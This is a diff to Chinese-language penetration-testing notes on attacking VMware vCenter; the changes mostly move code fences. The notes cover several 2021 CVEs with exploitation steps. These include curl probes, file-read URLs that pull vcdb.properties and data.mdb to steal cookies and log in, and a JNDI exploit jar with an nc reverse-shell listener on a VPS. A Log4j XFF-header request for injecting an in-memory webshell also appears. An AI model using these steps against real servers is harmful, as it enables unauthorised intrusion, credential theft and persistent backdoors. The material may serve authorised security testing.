@@ -353,7 +353,7 @@ https://www.jianshu.com/p/833582b2f560
 5、获取后台锁屏机器权限
 
 vcenter版本获取  /sdk/vimServiceVersions.xml
-
+```
 一、 CVE-2021-21972 – 未授权远程代码执行（vSphere Client 插件）
 1.漏洞描述
 
@@ -376,8 +376,8 @@ title="+ ID_VC_Welcome +"
 如果页面返回状态码为200、405，则可能存在漏洞
 
  https://github.com/NS-Sp4ce/CVE-2021-21972
-
-
+```
+```
 二、 CVE-2021-22005 – 任意文件上传导致远程代码执行
 
 1.漏洞描述
@@ -395,8 +395,8 @@ VMware vCenter Server 6.7 U3o
 3.复现
 curl -k -v "https://$VCENTER_HOST/analytics/telemetry/ph/api/level?_c=test"
 •如果服务器以 200/OK 和响应正文中除“OFF”以外的任何内容（例如“FULL”）进行响应，则它很容易受到攻击
-
-
+```
+```
 三、 CVE-2021-21980 任意文件读取漏洞
 1.影响范围
 vCenter Server 6.7
@@ -407,7 +407,9 @@ Cloud Foundation (vCenter Server) 3.x
 http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properties
 直接读取data.mdb文件，提取cookie，登录后台
 https://x.x.x.x/eam/vib?id=C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
+```
 
+```
 四、CVE-2021-21985 – vSAN 插件远程代码执行
 1.描述
 vSphere Client（HTML5）中的 vSAN Health Check 插件存在远程代码执行漏洞，攻击者可调用未授权方法执行代码。
@@ -421,7 +423,7 @@ VMware Cloud Foundation 4.x 系列 < 3.10.2.1
 工具链接：
 https://github.com/r0ckysec/CVE-2021-21985
 用法如下：
-1、在vps
+在vps
 java -jar JNDIInjection-Bypass.jar 1099 <监听port>
 2、在vps
 nc接收反弹shell
@@ -437,12 +439,14 @@ https://github.com/r0ckysec/CVE-2021-21985
 具体原理：
 利用ClassPathXmlApplicationContext类加载xml文件触发spel注入，weblogic和jackson都有关于这个类的cve，利用方式都差不多。
 https://github.com/alt3kx/CVE-2021-21985_PoC?tab=readme-ov-file
+```
 
-五、CVE-2021-44228 Log4j
-xff header jndi注入内存马
-漏洞成因是Vcenter的SAML路由中，可以通过增加XFF头触发漏洞，把需要执行的命令跟在XFF后面。
 
 ```
+五、CVE-2021-44228 Log4j
+xff header jndi注入内存马
+漏洞成因是Vcenter的SAML路由中，可以通过增加XFF头触发漏洞，把需要执行的命令跟在XFF后面
+
 GET/websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
 Host: 192.168.121.137
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
@@ -458,5 +462,7 @@ Sec-Fetch-Site: none
 Sec-Fetch-User: ?1
 Te: trailers
 Connection: close
-```
+
+
 DNSlog探测漏洞是否存在; 内网 不出网，可以在内网搭建ldap。  直接注入内存马
+```
